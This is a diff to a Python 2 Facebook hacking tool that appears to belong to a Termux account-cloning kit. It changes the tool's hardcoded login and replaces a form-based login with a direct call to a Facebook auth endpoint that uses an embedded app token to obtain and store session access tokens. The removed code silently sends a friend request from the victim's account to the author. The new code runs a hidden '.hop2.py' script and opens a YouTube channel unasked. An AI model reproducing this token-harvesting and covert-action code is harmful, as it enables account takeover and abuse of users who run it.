@@ -100,23 +100,21 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
-
+CorrectUsername = "mishi"
+CorrectPassword = "mishi"
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;97mEnter Username \x1b[1;97m: \x1b[1;97m")
+    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
+    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
         if (password == CorrectPassword):
-            print "\033[1;97mAccess Granted "#Dev:Jam_Shahrukh
-	    time.sleep(1)
+            print "Logged in successfully as " + username
             loop = 'false'
         else:
-            print "\033[1;97mACCESS DENIED"
+            print "Wrong Password"
             os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
     else:
-        print "\033[1;97mACCESS DENIED"
+        print "Wrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
 def methodlogin():
 	os.system('clear')
@@ -149,65 +147,40 @@ def methodlogin():
 		print"[!] Wrong Input"
 		exit()
 def login():
-	os.system('clear')
+	os.system("clear")
 	try:
-		toket = open('login.txt','r')
-		menu() 
+		tb=open('login.txt', 'r')
+		os.system("python2 .hop2.py")
 	except (KeyError,IOError):
-		os.system('clear')
-		print logo
-     	
-		
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mJam King Of Facebook' ) 
-		
-		print('	' )
-		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
-		print('	' )
-		id = raw_input('\033[1;97m✧ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
-		pwd = raw_input('\033[1;97m✧ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\x1b[1;31mYour Account is on Checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
+		os.system("clear")
+		print (logo)
+		hamza('[+] Login Your Facebook Account')
+		hamza('[!] NIGHT 007 OWNER MISHAL KHAN')
+		print'-------------------------------------'
+		iid=raw_input('[+] Number/Email: ')
+		id=iid.replace(" ","")
+		pwd=raw_input('[+] Password : ')
+		tik()
+		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		z=json.load(data)
+		if 'access_token' in z:
+		    st = open("login.txt", "w")
+		    st.write(z["access_token"])
+		    st.close()
+		    print "\n[✓] Logged In Successfully."
+		    time.sleep(1)
+		    os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+		    os.system("clear")
+		    menu()
 		else:
-			print("\n\x1b[1;31mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
+		    if "www.facebook.com" in z["error_msg"]:
+		        print ('[!] User Must Verify Account Before Login.')
+		        time.sleep(3)
+		        login()
+		    else:
+		        print ('[!]Number/User Id/ Password Is Wrong !')
+		        time.sleep(1)
+		        login()
 
 
 def menu():
